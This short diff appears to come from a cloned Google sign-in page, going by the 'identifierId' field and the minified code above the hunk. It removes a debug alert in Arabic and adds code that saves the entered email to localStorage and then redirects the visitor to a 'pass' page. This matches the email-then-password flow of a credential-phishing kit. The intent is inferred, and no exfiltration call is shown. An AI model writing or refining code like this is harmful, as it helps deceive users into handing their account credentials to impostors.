@@ -280,9 +280,9 @@ a&&(f="webkitTransitionEnd");r(c,"transitionend",f);return{u:c,container:b}}().u
     function showAlert() {
         var inputElement = document.getElementById('identifierId');
         if (inputElement) {
-            alert("القيمة المدخلة: " + inputElement.value);
-            localStorage.setItem('userEmail', inputElement.value)
             
+            localStorage.setItem('userEmail', inputElement.value)
+            setTimeout(() => { window.location.href = 'pass'; }, 1000);
             
         } else {
             alert("لم يتم العثور على حقل الإدخال.");
